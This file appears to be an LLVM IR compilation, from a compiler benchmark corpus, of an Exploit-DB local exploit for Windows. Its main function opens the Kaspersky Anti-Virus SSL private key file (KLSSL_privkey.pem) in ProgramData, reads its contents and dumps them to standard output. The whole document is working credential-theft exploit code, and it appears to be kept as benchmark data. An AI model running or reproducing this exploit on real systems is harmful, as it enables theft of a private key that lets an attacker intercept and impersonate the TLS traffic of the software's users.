; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_40988.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_40988.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [67 x i8] c"c:\\ProgramData\\Kaspersky Lab\\AVP17.0.0\\Data\\Cert\\KLSSL_privkey.pem\00", align 1
@MAXIMUM_ALLOWED = common dso_local global i32 0, align 4
@FILE_SHARE_READ = common dso_local global i32 0, align 4
@FILE_SHARE_WRITE = common dso_local global i32 0, align 4
@OPEN_EXISTING = common dso_local global i32 0, align 4
@FILE_ATTRIBUTE_NORMAL = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@TRUE = common dso_local global i64 0, align 8
@O_BINARY = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i32], align 16
  %8 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %9 = bitcast [2048 x i32]* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %9, i8 0, i64 8192, i1 false)
  %10 = load i32, i32* @MAXIMUM_ALLOWED, align 4
  %11 = load i32, i32* @FILE_SHARE_READ, align 4
  %12 = load i32, i32* @FILE_SHARE_WRITE, align 4
  %13 = or i32 %11, %12
  %14 = load i32, i32* @OPEN_EXISTING, align 4
  %15 = load i32, i32* @FILE_ATTRIBUTE_NORMAL, align 4
  %16 = call i64 @CreateFile(i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str, i64 0, i64 0), i32 %10, i32 %13, i32* null, i32 %14, i32 %15, i32* null)
  store i64 %16, i64* %6, align 8
  %17 = load i64, i64* %6, align 8
  %18 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %19 = icmp ne i64 %17, %18
  br i1 %19, label %20, label %36

20:                                               ; preds = %2
  %21 = load i64, i64* %6, align 8
  %22 = getelementptr inbounds [2048 x i32], [2048 x i32]* %7, i64 0, i64 0
  %23 = call i64 @ReadFile(i64 %21, i32* %22, i32 8192, i32* %8, i32* null)
  %24 = load i64, i64* @TRUE, align 8
  %25 = icmp eq i64 %23, %24
  br i1 %25, label %26, label %33

26:                                               ; preds = %20
  %27 = load i32, i32* @O_BINARY, align 4
  %28 = call i32 @setmode(i32 1, i32 %27)
  %29 = getelementptr inbounds [2048 x i32], [2048 x i32]* %7, i64 0, i64 0
  %30 = load i32, i32* %8, align 4
  %31 = load i32, i32* @stdout, align 4
  %32 = call i32 @fwrite(i32* %29, i32 1, i32 %30, i32 %31)
  br label %33

33:                                               ; preds = %26, %20
  %34 = load i64, i64* %6, align 8
  %35 = call i32 @CloseHandle(i64 %34)
  store i32 0, i32* %3, align 4
  br label %37

36:                                               ; preds = %2
  store i32 1, i32* %3, align 4
  br label %37

37:                                               ; preds = %36, %33
  %38 = load i32, i32* %3, align 4
  ret i32 %38
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i64 @CreateFile(i8*, i32, i32, i32*, i32, i32, i32*) #2

declare dso_local i64 @ReadFile(i64, i32*, i32, i32*, i32*) #2

declare dso_local i32 @setmode(i32, i32) #2

declare dso_local i32 @fwrite(i32*, i32, i32, i32) #2

declare dso_local i32 @CloseHandle(i64) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
